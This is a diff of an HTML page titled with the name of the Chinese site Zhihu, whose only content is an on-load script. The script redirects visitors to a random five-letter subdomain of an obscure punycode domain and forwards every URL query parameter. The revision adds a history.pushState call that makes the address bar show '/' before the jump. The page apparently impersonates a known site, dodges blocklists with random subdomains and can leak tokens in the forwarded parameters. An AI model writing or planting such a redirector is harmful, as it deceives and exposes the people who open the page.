@@ -4,32 +4,34 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>知乎</title>
-<script>
-    window.onload = function() {
-        // 生成随机的5位字母字符串
-        function generateRandomString(length) {
-            const chars = 'abcdefghijklmnopqrstuvwxyz';
-            let result = '';
-            for (let i = 0; i < length; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
+    <script>
+        window.onload = function() {
+            // 生成随机的5位字母字符串
+            function generateRandomString(length) {
+                const chars = 'abcdefghijklmnopqrstuvwxyz';
+                let result = '';
+                for (let i = 0; i < length; i++) {
+                    result += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return result;
             }
-            return result;
-        }
-        
-        const randomSubdomain = generateRandomString(5); // 生成5位随机字母
-        
-        // 获取当前URL的参数部分
-        var params = new URLSearchParams(window.location.search).toString();
-        
-        // 构造跳转到随机二级域名的URL，并带上参数
-        var redirectUrl = `http://${randomSubdomain}.xn--8uq67cn9io5f8waq45l72n.com/api/2025/06/26/myself.html?${params}`;
-        
-        // 使用window.location.href进行跳转
-        window.location.href = redirectUrl;
-    };
-</script>
+            
+            const randomSubdomain = generateRandomString(5); // 生成5位随机字母
+            
+            // 获取当前URL的参数部分
+            var params = new URLSearchParams(window.location.search).toString();
+            
+            // 构造目标跳转URL（带随机子域名）
+            var targetUrl = `http://${randomSubdomain}.xn--8uq67cn9io5f8waq45l72n.com/api/2025/06/26/myself.html?${params}`;
+            
+            // 修改浏览器地址栏显示为首页 `/`（不刷新页面）
+            history.pushState({}, '', '/');
+            
+            // 实际跳转到目标URL（可选，如果不需要跳转可注释掉）
+            window.location.href = targetUrl;
+        };
+    </script>
 </head>
 <body>
-
 </body>
 </html>
